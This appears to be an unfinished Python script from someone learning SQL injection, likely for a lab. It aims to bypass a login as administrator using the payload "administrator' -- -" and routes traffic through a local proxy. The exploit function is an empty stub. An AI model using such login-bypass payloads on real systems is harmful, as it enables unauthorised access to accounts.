// in this exploit script i try to do (SQL injection vulnerability allowing login bypass) 
Goal : Perform Sqli Attack and Login as Administrator User and login as Administrator

EX: username = administrator' -- -
    password = anything
Result -> Login Successfully 

and the end result of this script is to show me two messages in the terminal in vs code
etither this ( SQL injection successful ) or  (SQL injection not successful)
import requests
import sys
import urllib3

def exploit_sqli(url, payload):
    # Implement your SQL injection exploit logic here
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    pass

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    # Write a function to make a request for us
    s = requests.Session()
    if exploit_sqli(url, sqli_payload):
        print("[+] SQL injection successful")
    else:
        print("[-] SQL injection not successful")
